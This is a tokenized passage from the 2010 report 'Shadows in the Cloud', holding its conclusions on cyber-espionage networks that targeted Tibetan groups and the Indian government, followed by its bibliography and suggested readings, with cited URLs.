"architecture", "and", "aims", "of", "these", "networks", "ultimately", "remain", "a", "mystery", "and", "await", "further", "investigation", "and", "analysis", "."], ["However", ",", "even", "with", "the", "partial", "insights", "and", "fleeting", "glimpses", "acquired", "here", ",", "we", "can", "draw", "some", "conclusions", "and", "implications", "for", "further", "research", ",", "policy", "and", "operations", "."], ["First", ",", "the", "research", "here", "shows", ",", "as", "with", "Tracking", "GhostNet", ",", "how", "even", "a", "relatively", "small", "research", "sample", "\u2014", "in", "this", "case", "Tibetan", "organizations", "\u2014", "can", "expand", ",", "upon", "investigation", "and", "analysis", ",", "into", "an", "astonishingly", "large", "pool", "of", "victims", "."], ["The", "connections", "drawn", "out", "here", "beg", "the", "question", "of", "what", "would", "emerge", "if", "the", "research", "began", "with", "a", "different", "group", ",", "from", "a", "different", "region", "of", "the", "world", ",", "with", "a", "different", "target", "set", "of", "compromised", "actors", "?"], ["Clearly", ",", "an", "area", "of", "methodological", "advantage", "for", "both", "the", "Tracking", "GhostNet", "and", "the", "Shadows", "in", "the", "Cloud", "investigations", "was", "to", "have", "access", "in", "the", "field", "to", "compromised", "computers", "and", "be", "able", "to", "work", "outwards", "in", "a", "structured", "and", "systematic", "fashion", ",", "using", "a", "combination", "of", "technical", "investigations", "and", "data", "analysis", "."], ["An", "area", "of", "further", "research", "is", "to", "extend", "such", "efforts", "to", "other", "locations", "in", "other", "regions", "of", "the", "world", "."], ["Such", "investigations", "may", "reveal", "other", "malware", "networks", ",", "or", "entirely", "new", "and", "unanticipated", "modes", "of", "crime", "and", "espionage", "."], ["Second", ",", "Shadows", "in", "the", "Cloud", "underscores", "the", "extent", "to", "which", "the", "global", "networked", "society", "into", "which", "we", "have", "evolved", "socially", ",", "politically", ",", "economically", ",", "and", "militarily", "carries", "with", "it", "an", "underground", "ecoystem", "that", "is", "equally", "networked", ",", "though", "far", "less", "visible", "to", "those", "whom", "it", "compromises", "."], ["Governments", ",", "organizations", "and", "other", "actors", "around", "the", "world", "have", "been", "quick", "to", "adopt", "computerized", "public", "and", "administration", "systems", ",", "including", "state", "security", "actors", "."], ["Their", "investments", "into", "these", "technologies", "have", "developed", "at", "a", "much", "faster", "rate", "than", "the", "appropriate", "security", "policies", "and", "practices", "(", "Deibert", "and", "Rohozinski", "2010", ")", "."], ["Although", "the", "Government", "of", "India", "was", "the", "most", "victimized", "according", "to", "what", "we", "uncovered", "in", "Shadows", "in", "the", "Cloud", "\u2014", "and", "that", "certainly", "should", "yield", "a", "major", "consideration", "of", "public", "policy", "and", "security", "for", "that", "country", "\u2014", "observations", "about", "India", "in", "this", "respect", "need", "to", "be", "qualified", "in", "at", "least", "two", "ways", "."], ["First", ",", "Shadows", "in", "the", "Cloud", "reports", "only", "on", "observations", "and", "existing", "evidence", ",", "which", "by", "definition", "remain", "partial", "."], ["There", "could", "be", "other", "countries", "victimized", ",", "involving", "these", "very", "same", "malware", "networks", "attackers", ",", "but", "of", "which", "we", "are", "unaware", "because", "of", "our", "limited", "samples", "."], ["Second", ",", "and", "most", "importantly", ",", "there", "are", "numerous", "other", "countries", "and", "international", "organizations", "that", "are", "targeted", "here", ",", "perhaps", "not", "to", "the", "same", "extent", ",", "but", "targeted", "and", "infiltrated", "nonetheless", "."], ["We", "can", "only", "infer", "what", "type", "of", "data", "was", "exfiltrated", "from", "these", "other", "actors", "that", "is", "of", "strategic", "value", "."], ["Overall", ",", "however", ",", "the", "key", "point", "to", "draw", "is", "that", "networked", "societies", "can", "be", "compromised", "through", "networks", "in", "which", "they", "are", "invariably", "linked", "and", "mutually", "dependent", "."], ["Third", ",", "and", "related", ",", "Shadows", "in", "the", "Cloud", "demonstrates", "clearly", "the", "potential", "for", "collateral", "compromise", ",", "one", "of", "the", "key", "hypotheses", "informing", "our", "research", "framework", "."], ["This", "investigation", "indicates", "that", "data", "leakage", "from", "malware", "networks", "can", "compromise", "unwitting", "third", "parties", "who", "are", "not", "initially", "targeted", "by", "the", "attackers", "."], ["Data", "contained", "on", "compromised", "machines", "can", "also", "contain", "valuable", "information", "on", "third", "parties", "that", "while", "on", "its", "own", "may", "not", "be", "significant", ",", "but", "when", "pieced", "together", "with", "other", "information", "can", "provide", "actionable", "and", "operational", "intelligence", "."], ["The", "policy", "and", "operational", "implications", "of", "collateral", "compromise", "are", "serious", "and", "wideranging", ",", "and", "reinforce", "that", "security", "is", "only", "as", "strong", "as", "the", "weakest", "link", "in", "a", "chain", "."], ["In", "today", "\u2019s", "networked", "world", ",", "such", "chains", "are", "complex", ",", "overlapping", "and", "dispersed", "across", "numerous", "technological", "platforms", "crossing", "multiple", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "6", ":", "CONCLUSIONS", "44", "national", "jurisdictions", "."], ["Paying", "attention", "to", "domestic", "cyber", "security", "is", "therefore", "only", "a", "partial", "solution", "to", "a", "much", "wider", "problem", "."], ["Today", ",", "no", "country", "or", "organization", "is", "a", "secure", "island", "in", "the", "global", "sea", "of", "information", "."], ["Fourth", ",", "another", "implication", "raised", "by", "Shadows", "in", "the", "Cloud", "is", "for", "criminal", "networks", "to", "be", "repurposed", "for", "political", "espionage", "as", "part", "of", "an", "evolution", "in", "signals", "intelligence", "."], ["Although", "our", "conclusions", "are", "necessarily", "circumscribed", "by", "our", "lack", "of", "complete", "information", "in", "this", "respect", ",", "we", "may", "be", "seeing", "a", "blurring", "of", "the", "lines", "in", "malware", "genotypes", "among", "crimeware", "and", "more", "politically", "-", "motivated", "attacks", "."], ["Part", "of", "that", "blurring", "may", "be", "deliberate", "on", "the", "part", "of", "actors", "wishing", "to", "obscure", "attribution", ",", "but", "part", "of", "it", "may", "also", "be", "a", "newly", "emerging", "and", "largely", "organic", "market", "for", "espionage", "products", "that", "was", "either", "contained", "or", "nonexistent", "in", "the", "past", ",", "and", "which", "now", "supplements", "the", "market", "for", "industrial", "espionage", "."], ["This", "market", "may", "present", "opportunities", "for", "actors", "that", ",", "in", "turn", ",", "produce", "a", "refinement", "in", "their", "approach", "or", "methodology", "."], ["Criminal", "actors", "may", "troll", "for", "targets", "widely", "as", "a", "first", "cut", ",", "triaging", "among", "the", "available", "sources", "of", "information", "to", "zero", "-", "in", "on", "those", "that", "yield", "commercial", "value", "on", "both", "the", "industrial", "and", "political", "espionage", "markets", "."], ["Such", "a", "development", "would", "pose", "major", "policy", "and", "operational", "issues", ",", "and", "accelerate", "existing", "trends", "down", "the", "road", "of", "cyber", "privateering", "."], ["Finally", ",", "a", "major", "implication", "of", "the", "findings", "of", "Shadows", "in", "the", "Cloud", "relates", "to", "the", "evolution", "towards", "cloud", "computing", ",", "social", "networking", "and", "peer", "-", "to", "-", "peer", "networking", "technologies", "that", "characterize", "much", "of", "the", "global", "networked", "society", "today", "."], ["These", "new", "modes", "of", "information", "storage", "and", "communication", "carry", "with", "them", "many", "conveniences", "and", "so", "now", "are", "fully", "integrated", "into", "personal", "life", ",", "business", ",", "government", "and", "social", "organization", "."], ["But", "as", "shown", "in", "the", "Shadow", "investigation", ",", "these", "new", "platforms", "are", "also", "being", "used", "as", "vectors", "of", "malware", "propagation", "and", "command", "and", "control", "(", "Office", "of", "Privacy", "Commissioner", "of", "Canada", "2010", ")", "."], ["It", "is", "often", "said", "that", "dark", "clouds", "carry", "with", "them", "silver", "linings", ",", "but", "in", "this", "case", "the", "clouds", "contain", "within", "them", "a", "dark", "hidden", "core", "."], ["As", "we", "document", "above", ",", "blog", "hosting", "sites", ",", "social", "networking", "forums", "and", "mail", "groups", "were", "turned", "into", "support", "structures", "and", "command", "and", "control", "systems", "for", "a", "malignant", "enterprise", "."], ["The", "very", "same", "characteristics", "of", "those", "social", "networking", "and", "cloud", "platforms", "which", "make", "them", "so", "attractive", "to", "the", "legitimate", "user", "\u2014", "reliability", ",", "distribution", ",", "redundancy", "and", "so", "forth", "\u2014", "were", "what", "attracted", "our", "attackers", "to", "them", "in", "setting", "up", "their", "network", "."], ["Clouds", "provide", "criminals", "and", "espionage", "networks", "with", "convenient", "cover", ",", "tiered", "defences", ",", "redundancy", ",", "cheap", "hosting", "and", "conveniently", "distributed", "command", "and", "control", "architectures", "."], ["They", "also", "provide", "a", "stealthy", "and", "very", "powerful", "mode", "of", "infiltrating", "targets", "who", "have", "become", "accustomed", "to", "clicking", "on", "links", "and", "opening", "PDFs", "and", "other", "documents", "as", "naturally", "as", "opening", "an", "office", "door", "."], ["What", "is", "required", "now", "is", "a", "much", "greater", "reflection", "on", "what", "it", "will", "take", ",", "in", "terms", "of", "personal", "computing", ",", "corporate", "responsibility", "and", "government", "policy", ",", "to", "acculturate", "a", "greater", "sensibility", "around", "cloud", "security", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "45", "Bibliography", "Adair", ",", "Steven", "."], ["January", "19", ",", "2010", "."], ["\u201c", "Cyber", "Espionage", ":", "Death", "by", "1000", "Cuts", ",", "\u201d", "Shadowserver", "Foundation", ",", "http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20100119", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Bakken", ",", "B\u00f8rge", ",", "ed", "."], ["2005", "."], ["Crime", ",", "Punishment", ",", "and", "Policing", "in", "China", "."], ["Lanham", ",", "MD", ":", "Rowman", "&", "Littlefield", "."], ["Bejtlich", ",", "Richard", "."], ["January", "22", ",", "2010", "."], ["\u201c", "Attribution", "Using", "20", "Characteristics", ",", "\u201d", "TaoSecurity", ",", "http://taosecurity.blogspot.com/2010/01/attribution-using-20-characteristics.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Burstein", ",", "Aaron", "J.", "2008", "."], ["\u201c", "Conducting", "Cybersecurity", "Research", "Legally", "and", "Ethically", ",", "\u201d", "LEET", "2008", ",", "San", "Francisco", ",", "CA", ",", "http://www.usenix.org/event/leet08/tech/full_papers/burstein/burstein_html/", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Curle", ",", "Adam", ".", "1949", "."], ["\u201c", "A", "Theoretical", "Approach", "to", "Action", "Research", ",", "\u201d", "Human", "Relations", ",", "2:3", ",", "269", "-", "280", "."], ["Choo", ",", "Kim", "-", "Kwang", "Raymond", ",", "2008", "."], ["\u201c", "Organised", "Crime", "Groups", "in", "Cyberspace", ":", "A", "Typology", ",", "\u201d", "Trends", "in", "Organized", "Crime", ",", "11:3", ",", "270", "-", "295", "."], ["Cloppert", ",", "Mike", "."], ["October", "14", ",", "2009", "."], ["\u201c", "Security", "Intelligence", ":", "Attacking", "the", "Kill", "Chain", ",", "\u201d", "SANS", "Computer", "Forensics", "Investigations", "and", "Incident", "Response", "Blog", ",", "http://blogs.sans.org/computer-forensics/2009/10/14/security-intelligence-attacking-the-kill-chain/", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Cooke", ",", "Evan", ".", ",", "Farnam", "Jahanian", ",", "Danny", "McPherson", "."], ["2005", "."], ["\u201c", "The", "Zombie", "Roundup", ":", "Understanding", ",", "Detecting", ",", "and", "Disrupting", "Botnets", ",", "\u201d", "USENIX", ",", "SRUTI", "2005", ",", "Cambridge", ",", "MA", ",", "http://www.usenix.org/event/sruti05/tech/cooke.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Dagon", ",", "David", ",", "Cliff", "Zou", ",", "and", "Wenke", "Lee", "."], ["2006", "."], ["\u201c", "Modeling", "Botnet", "Propagation", "Using", "Time", "Zones", ",", "\u201d", "NDSS", "2006", ",", "San", "Diego", "CA", ",", "http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.128.8689&rep=rep1&type=pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Defence", "Research", "and", "Development", "Organisation", "."], ["February", "1", ",", "2009", "."], ["\u201c", "Tactical", "command", ",", "control", ",", "communication", ",", "computer", "and", "intelligence", ".", "\u201d"], ["Bulletin", ",", "http://www.drdo.org/pub/techfocus/2009/feb09.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Deibert", ",", "Ronald", ",", "and", "Rafal", "Rohozinski", "."], ["2010", "."], ["\u201c", "Risking", "Security", ":", "The", "policies", "and", "paradoxes", "of", "cyberspace", "security", ",", "\u201d", "International", "Political", "Sociology", ",", "4:1", ",", "15", "-", "32", "."], ["Deloitte", "&", "Touche", "LLP", ",", "2010", "."], ["Cyber", "Crime", ":"], ["A", "Clear", "and", "Present", "Danger", "Combating", "the", "Fastest", "Growing", "Cyber", "Security", "Threat", ",", "http://www.deloitte.com/assets/Dcom-UnitedStates/Local%20Assets/Documents/AERS/us_aers_Deloitte%20Cyber%20Crime%20", "POV%20Jan252010.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["F", "-", "Secure", "."], ["2010", "."], ["\u201c", "PDF", "Based", "Targeted", "Attacks", "are", "Increasing", ",", "\u201d", "http://www.f-secure.com/weblog/archives/00001903.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Frontier", "India", "."], ["June", "12", ",", "2009", "."], ["\u201c", "Artillery", "Combat", "Command", "and", "Control", "System", "SHAKTI", "dedication", "to", "Indian", "Army", ".", "\u201d"], ["http://frontierindia.net/artilery-combat-command-and-control-system-shakti-dedication-to-indian-army", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Henderson", ",", "Scott", ".", "2009a", "."], ["\u201c", "CasperNet", "Gets", "Punked", ",", "\u201d", "The", "Dark", "Visitor", "blog", ",", "http://www.thedarkvisitor.com/tag/lost33", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Henderson", ",", "Scott", ".", "2009b", "."], ["\u201c", "Hunting", "the", "GhostNet", "Hacker", ",", "\u201d", "The", "Dark", "Visitor", "blog", ",", "http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Henderson", ",", "Scott", ".", "2007a", "."], ["\u201c", "Top", "Chinese", "Hackers", ",", "\u201d", "The", "Dark", "Visitor", "blog", ",", "http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker(accessed", "April", "1", ",", "2010", ")", "."], ["Henderson", ",", "Scott", "."], ["2007b", "."], ["The", "Dark", "Visitor", "."], ["http://www.lulu.com/items/volume_62/2048000/2048958/4/print/2048958.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "46", "Higgins", ",", "Kelly", "Jackson", "."], ["September", "24", ",", "2008", "."], ["\u201c", "Shadowserver", "to", "Build", "Sinkhole", "to", "Find", "Errant", "Bots", ",", "\u201d", "Dark", "Reading", ",", "http://www.darkreading.com/security/management/showArticle.jhtml?articleID=211201241", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["India", "Defence", "."], ["2007", "."], ["\u201c", "Indian", "Army", "Tests", "Indigenous", "Battlefield", "Surveillance", "System", ",", "\u201d", "http://www.india-defence.com/reports-3171", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Indian", "Embassy", "."], ["1998", "."], ["\u201c", "National", "Security", "Council", "Setup", ",", "\u201d", "http://www.indianembassy.org/inews/December98/9.htm", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Indian", "Government", "."], ["2010", "."], ["\u201c", "Overseas", ".", "\u201d"], ["http://india.gov.in/overseas.php", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Jagatic", ",", "Tom", "N.", ",", "Nathaniel", "A.", "Johnson", ",", "Markus", "Jakobsson", ",", "and", "Filippo", "Menczer", "."], ["2007", "."], ["\u201c", "Social", "Phishing", ",", "\u201d", "Communications", "of", "the", "ACM", ",", "50:10", ",", "94", "-", "100", ",", "http://portal.acm.org/citation.cfm?id=1290958.1290968&coll=GUIDE&dl=GUIDE&CFID=74760848&CFTOKEN=96817982"], ["(", "accessed", "April", "1", ",", "2010", ")", "."], ["Keith", ",", "Ronald", "and", "Zhiqiu", "Lin", "."], ["2005", "."], ["New", "Crime", "in", "China", ":", "Public", "Order", "and", "Human", "Rights", "."], ["London", ":", "Routledge", "."], ["Lam", ",", "Willy", "."], ["November", "18", ",", "2009", "."], ["\u201c", "Mafias", "expose", "China", "\u2019s", "legal", "woes", ",", "\u201d", "Asia", "Times", "Online", ",", "http://www.atimes.com/atimes/China/KK18Ad01.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Lewin", ",", "Kurt", ".", "1946", "."], ["\u201c", "Action", "Research", "and", "Minority", "Problems", ",", "\u201d", "Journal", "of", "Social", "Issues", ",", "2", ",", "34", "-", "46", "."], ["Mandiant", ",", "2010", "."], ["M", "Trends", ":", "The", "Advanced", "Persistent", "Threat", ",", "http://www.mandiant.com/products/services/m-trends", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Markoff", ",", "John", ",", "and", "David", "Barboza", "."], ["February", "18", ",", "2010", "."], ["\u201c", "2", "China", "Schools", "Said", "to", "Be", "Tied", "to", "Online", "Attacks", ".", "\u201d"], ["New", "York", "Times", ",", "http://www.nytimes.com/2010/02/19/technology/19china.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Nazario", ",", "Jose", ".", "2009a", "."], ["\u201c", "Twitter", "-", "based", "Botnet", "Command", "Channe", ",", "\u201d", "Arbor", "Networks", ",", "http://asert.arbornetworks.com/2009/08/twitter-based-botnet-command-channel", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Nazario", ",", "Jose", ".", "2009b", "."], ["\u201c", "Malicious", "Google", "AppEngine", "Used", "as", "a", "CnC", ",", "\u201d", "Arbor", "Networks", ",", "http://asert.arbornetworks.com/2009/11/malicious-google-appengine-used-as-a-cnc"], ["(", "accessed", "April", "1", ",", "2010", ")", "."], ["Nolan", ",", "Jason", ",", "and", "Michelle", "Levesque", "."], ["2005", "."], ["\u201c", "Hacking", "human", ":", "data", "-", "archaeology", "and", "surveillance", "in", "social", "networks", ",", "\u201d", "ACM", "SIGGROUP", "Bulletin", ",", "25:2", ",", "33", "-", "37", ",", "http://portal.acm.org/citation.cfm?id=1067721.1067728&coll=ACM&dl=ACM&CFID=84425230&CFTOKEN=14042216", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Northrop", "Grumman", "."], ["2009", "."], ["Capability", "of", "the", "People", "\u2019s", "Republic", "of", "China", "to", "Conduct", "Cyber", "Warfare", "and", "Computer", "Network", "Exploitation", ",", "http://www.uscc.gov/.../NorthropGrumman_PRC_Cyber_Paper_FINAL_Approved%20Report_16Oct2009.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Office", "Of", "the", "Privacy", "Commissioner", "of", "Canada", "."], ["2010", "."], ["Reaching", "for", "the", "Cloud(s):Privacy", "Issues", "related", "to", "Cloud", "Computing", "."], ["http://www.priv.gc.ca/information/pub/cc_201003_e.cfm", "(", "accessed", "April", "2", ",", "2010", ")", "."], ["Parker", ",", "Tom", ",", "Eric", "Shaw", ",", "Ed", "Stroz", ",", "Matthew", "G.", "Devost", ",", "and", "Marcus", "H.", "Sachs", "."], ["2004", "."], ["Cyber", "Adversary", "Characterization", ":"], ["Auditing", "the", "Hacker", "Mind", ",", "Syngress", "Publishing", "Inc", ":", "Rockland", "MA", "."], ["Parker", ",", "Tom", ",", "Dave", "Farell", ",", "Toby", "Miller", ",", "and", "Matthew", "G.", "Devost", "."], ["2003", "."], ["\u201c", "Adversary", "Characterization", "and", "Scoring", "Systems", ",", "\u201d", "Blackhat", "2003", ",", "Las", "Vegas", ",", "NV", "."], ["http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-parker.pdf", "."], ["Ramachandran", ",", "Anirudh", ".", ",", "Nick", "Feamster", ",", "and", "David", "Dagon", "."], ["2006", "."], ["\u201c", "Revealing", "Botnet", "Membership", "Using", "DNSBL", "Counter", "-", "Intelligence", ".", "\u201d"], ["USENIX", ",", "SRUTI", "2006", ",", "San", "Jose", ",", "CA", ",", "http://www.usenix.org/events/sruti06/tech/full_papers/ramachandran/ramachandran.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "47", "Rajab", ",", "Moheeb", "Abu", ".", ",", "Jay", "Zarfoss", ",", "Fabian", "Monrose", ",", "and", "Andreas", "Terzis", "."], ["2007", "."], ["\u201c", "My", "Botnet", "is", "Bigger", "than", "Yours", "(", "Maybe", ",", "Better", "than", "Yours", "):", "Why", "Size", "Estimates", "Remain", "Challenging", "\u201d", "."], ["USENIX", ",", "Hotbots", "2007", ",", "Cambridge", ",", "MA", ",", "http://www.usenix.org/event/hotbots07/tech/full_papers/rajab/rajab.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Ratzlav", "-", "Katz", ",", "Nissan", "."], ["January", "7", ",", "2010", "."], ["\u201c", "\u2019", "Iron", "Dome", "\u2019", "Anti", "-", "Missile", "System", "Ready", "for", "Deployment", ",", "\u201d", "Arutz", "Sheva", ",", "http://www.israelnationalnews.com/News/News.aspx/135406", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Saikorian", "Association", "."], ["Website", ",", "www.saikorian.org", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Smith", ",", "Allen", "M.", ",", "Nancy", "Y.", "Toppel", "."], ["2009", "."], ["\u201c", "Case", "Study", ":", "Using", "Security", "Awareness", "to", "Combat", "the", "Advanced", "Persistent", "Threat", ",", "\u201d", "13th", "Colloquium", "for", "Information", "Systems", "Security", "Education", ",", "Seattle", ",", "WA", ",", "http://www.cisse2009.com/colloquia/cisse13/proceedings/PDFs/Papers/S03P02.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["SP", "\u2019s", "Land", "Forces", ".", "2008", "."], ["\u201c", "Network", "Centricity", ":", "An", "answer", "to", "security", "threats", ".", "\u201d"], ["http://www.spslandforces.net/news.asp?news=16", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Stone", "-", "Gross", ",", "Brett", ",", "Marco", "Cova", ",", "Lorenzo", "Cavallaro", ",", "Bob", "Gilbert", ",", "Martin", "Szydlowski", ",", "Richard", "Kemmerer", ",", "Christopher", "Kruegel", ",", "and", "Giovanni", "Vigna", "."], ["2009", "."], ["\u201c", "Your", "Botnet", "is", "My", "Botnet", ":", "Analysis", "of", "a", "Botnet", "Takeover", ",", "\u201d", "ACM", ",", "CCS", "2009", ",", "Chicago", ",", "IL", ",", "http://www.cs.ucsb.edu/%7Eseclab/projects/torpig/torpig.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Subrahmanyam", ",", "Krishnaswamy", "."], ["January", "22", ",", "2010", "."], ["\u201c", "National", "Security", "Advisor", ":", "Does", "India", "Need", "One", "?", "\u201d"], ["The", "Northlines", ",", "http://www.northlines.in/newsdet.aspx?q=28365", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Symantec", "."], ["2010", "."], ["\u201c", "The", "Nature", "of", "Cyber", "Espionage", ":"], ["Most", "Malicious", "File", "Types", "Identified", "and", "Encrypted", "Spam", "from", "Rustock", ",", "\u201d", "MessageLabs", "Intelligence", ",", "http://www.messagelabs.com/mlireport/MLI_2010_03_Mar_FINAL-EN.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Symantec", "."], ["2009a", "."], ["\u201c", "Trojan", "."], ["Whitewell", ":"], ["What", "\u2019s", "your", "(", "bot", ")"], ["Facebook", "Status", "Today", "?", "\u201d"], ["Symantec", "Security", "Response", "Blog", ",", "http://www.symantec.com/connect/blogs/trojanwhitewell-what-s-your-bot-facebook-status-today", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Symantec", ".", "2009b", "."], ["\u201c", "Google", "Groups", "Trojan", ",", "\u201d", "Symantec", "Security", "Response", "Blog", ",", "http://www.symantec.com/connect/blogs/google-groups-trojan", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Thibodeau", ",", "Patrick", ",", "2010", "."], ["\u201c", "FBI", "List", "Top", "10", "Posts", "in", "Cybercriminal", "Operations", ",", "\u201d", "Computer", "World", ",", "http://www.computerworld.com/s/article/9173965/FBI_lists_Top_10_posts_in_cybercriminal_operations", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Unmask", "Parasites", "."], ["2009", "."], ["\u201c", "Hackers", "Use", "Twitter", "API", "To", "Trigger", "Malicious", "Scripts", ",", "\u201d", "http://blog.unmaskparasites.com/2009/11/11/hackers-use-twitter-api-to-trigger-malicious-scripts", "(", "accessed", "April", "2", ",", "2010", ")", "."], ["Vallentin", ",", "Matthias", ",", "Jon", "Whiteaker", ",", "and", "Yahel", "Ben", "-", "David", "."], ["2009", "."], ["\u201c", "The", "Gh0st", "in", "the", "Shell", ":", "Network", "Security", "in", "the", "Himalayas", ",", "\u201d", "UC", "Berkeley", ",", "http://cs.berkeley.edu/~mavam/cw/cs294-28-paper.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", ".", "2008a", "."], ["\u201c", "Is", "Troy", "Burning", "?"], ["An", "Overview", "of", "Targeted", "Trojan", "Attacks", ",", "\u201d", "SANS", "Internet", "Storm", "Center", ",", "SANSFire", "2008", ",", "Washington", "DC", "."], ["http://isc.sans.org/.../SANSFIRE2008-Is_Troy_Burning_Vanhorenbeeck.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", "."], ["2008b", "."], ["\u201c", "Overview", "of", "Cyber", "Attacks", "Against", "Tibetan", "Communities", ",", "\u201d", "Internet", "Storms", "Centre", ",", "http://isc.sans.org/diary.html?storyid=4177", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", "."], ["2007", "."], ["\u201c", "Crouching", "PowerPoint", ",", "Hidden", "Trojan", ",", "\u201d", "24th", "Chaos", "Communication", "Congress", ",", "Berlin", ",", "http://events.ccc.de/congress/2007/Fahrplan/events/2189.en.htm", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Vass", ",", "Lisa", "."], ["November", "8", ",", "2009", "."], ["\u201c", "RBN", "Gang", "Moves", "Setups", "Shop", "in", "China", ",", "\u201d", "eWeek", ",", "http://www.eweek.com/c/a/Security/RBN-Gang-Moves-Sets-Up-Shop-in-China/", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Villeneuve", ",", "Nart", "."], ["2010", "."], ["\u201c", "The", "\u201c", "Kneber", "\u201d", "Botnet", ",", "Spear", "Phishing", "Attacks", "and", "Crimeware", "\u201d", ",", "Information", "Warfare", "Monitor", ",", "http://www.infowar-monitor.net/2010/03/the-kneber-botnet-spear-phishing-attacks-and-crimeware/", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Zetter", ",", "Kim", "."], ["2009", "."], ["\u201c", "Electronic", "Spy", "Network", "Focused", "on", "Dalai", "Lama", "and", "Embassy", "Computers", ".", "\u201d"], ["Wired", "Magazine", ",", "March", "28", ",", "http://www.wired.com/threatlevel/2009/03/spy-system-focu", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "48", "Zetter", ",", "Kim", "."], ["2007a", "."], ["\u201c", "Rogue", "Nodes", "turn", "Tor", "Anonymizer", "into", "Eavesdropper", "\u2019s", "Paradise", ",", "\u201d", "Wired", "Magazine", ",", "http://www.wired.com/politics/security/news/2007/09/embassy_hack", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Zetter", ",", "Kim", "."], ["2007b", "."], ["\u201c", "Tor", "Researcher", "Who", "Exposed", "Embassy", "E", "-", "mail", "Passwords", "gets", "Raided", "by", "Swedish", "FBI", "and", "CIA", ",", "\u201d", "Threat", "Level", ",", "Wired", "Magazine", ",", "http://www.wired.com/threatlevel/2007/11/swedish-researc/#ixzz0ex7BEUYk", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Suggested", "Readings"], ["Targeted", "Malware", "Research", "Aeon", "Security", "Blog", "."], ["February", "8", ",", "2010", "."], ["\u201c", "Defending", "Against", "Advanced", "Persistent", "Threats", ",", "\u201d", "http://www.theaeonsolution.com/security/?p=231", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Aeon", "Security", "Blog", "."], ["February", "16", ",", "2010", "."], ["\u201c", "You", "Say", "Advanced"], ["I", "Say", "Structured", ",", "\u201d", "http://www.theaeonsolution.com/security/?p=251"], ["(", "accessed", "April", "1", ",", "2010", ")", "."], ["Beecroft", ",", "Alexander", "."], ["2009", "."], ["Passive", "Fingerprinting", "of", "Comptuer", "Network", "Reconnaissance", "Tools", ",", "Naval", "Postgraduate", "School", ",", "http://www.dtic.mil/cgi-bin/GetTRDoc?AD=ADA509167&amp;Location=U2&amp;doc=GetTRDoc.pdf", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["FireEye", "Malware", "Intelligence", "Lab", "."], ["November", "6", "2009", "."], ["\u201c", "Smashing", "the", "Mega", "-", "d", "/", "Ozdok", "botnet", "in", "24", "hours", ",", "\u201d", "http://blog.fireeye.com/research/2009/11/smashing-the-ozdok.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["McDougal", ",", "Monty", ".", "2009", "."], ["\u201c", "Castle", "Warrior", ":", "Redefining", "21st", "Century", "Network", "Defense", "\u201d", "."], ["5th", "Annual", "Workshop", "on", "Cyber", "Security", "and", "Information", "Intelligence", "Research", ":", "Cyber", "Security", "and", "Information", "Intelligence", "Challenges", "and", "Strategies", ",", "Oakridge", ",", "TN", "."], ["http://portal.acm.org/citation.cfm?id=1558607.1558675", "(", "accessed", "April", "1", ",", "2010", ")", "."], 